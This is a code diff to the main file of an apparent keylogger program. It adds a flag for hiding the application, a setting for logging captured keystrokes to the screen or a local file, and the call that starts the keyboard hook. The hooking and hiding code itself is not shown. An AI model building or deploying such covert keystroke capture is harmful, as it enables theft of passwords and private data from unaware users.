@@ -41,9 +41,22 @@
 #include "DataLog.h"
 #include "KeyLogger.h"
 
-
+/**
+  * HIDDEN: Variable to determine visible state of application
+  *        true:      Hides application
+  *        false:     Does not hide application
+  *                   (usefull for debug mode)
+  */
 const bool HIDDEN = false;
 
+/**
+  * LOG_MODE: Variable to determine how data will be trapped
+  *           (See DataLog class, or respective LogType class)
+  *           DEBUG:      Data will be written to the screen
+  *                       (it is usefull to make HIDDEN = false)
+  *           LOCAL_FILE: Data will be written to a local file
+  */
+const LogTypeName LOG_MODE = DEBUG;
 
 void hideMe(void);
 void startLog(DataLog datalog);
@@ -55,7 +68,7 @@ int main (void)
        hideMe();
        
     // Create DataLog object. Current LogTypes are DEBUG and LOCAL_FILE
-    DataLog datalog(DEBUG);
+    DataLog datalog(LOG_MODE);
     
     // Add initial data to the log
     startLog(datalog);
@@ -64,7 +77,7 @@ int main (void)
     KeyLogger keylog(datalog);
     
     // Pass control to KeyLoggerObject
-    
+    keylog.hookIt();
     
     return EXIT_SUCCESS;
 }
